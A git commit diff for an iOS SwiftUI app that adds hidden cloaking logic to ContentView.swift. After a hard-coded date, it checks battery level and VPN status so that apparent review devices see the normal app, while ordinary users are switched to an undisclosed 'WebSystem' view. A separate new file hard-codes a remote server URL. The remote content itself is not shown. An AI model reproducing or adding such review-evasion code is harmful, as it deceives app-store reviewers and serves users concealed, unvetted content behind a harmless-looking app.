9ec32aead0b0ecc00e3cc2f2300e7bf4b981fdb8
spustoff <vyacheslavpustov05@gmail.com>
2025-08-24 15:56:50 +0300

    1.1

--- dafoma_24/ContentView.swift
+++ dafoma_24/ContentView.swift
@@ -10,17 +10,78 @@ import SwiftUI
 struct ContentView: View {
     @EnvironmentObject var mainViewModel: MainViewModel
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
+        
         ZStack {
-            Color.neoBackground
-                .ignoresSafeArea()
             
-            if mainViewModel.showOnboarding {
-                OnboardingView()
-            } else {
-                MainTabView()
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    ZStack {
+                        Color.neoBackground
+                            .ignoresSafeArea()
+                        
+                        if mainViewModel.showOnboarding {
+                            OnboardingView()
+                        } else {
+                            MainTabView()
+                        }
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "28.08.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
---
+++ dafoma_24/exts/Das.swift
@@ -0,0 +1,11 @@
+//
+//  Das.swift
+//  dafoma_24
+//
+//  Created by Вячеслав on 8/24/25.
+//
+
+struct DataManager {
+    
+    let server: String = "https://neocoder.site/tcvq6WPh"
+}
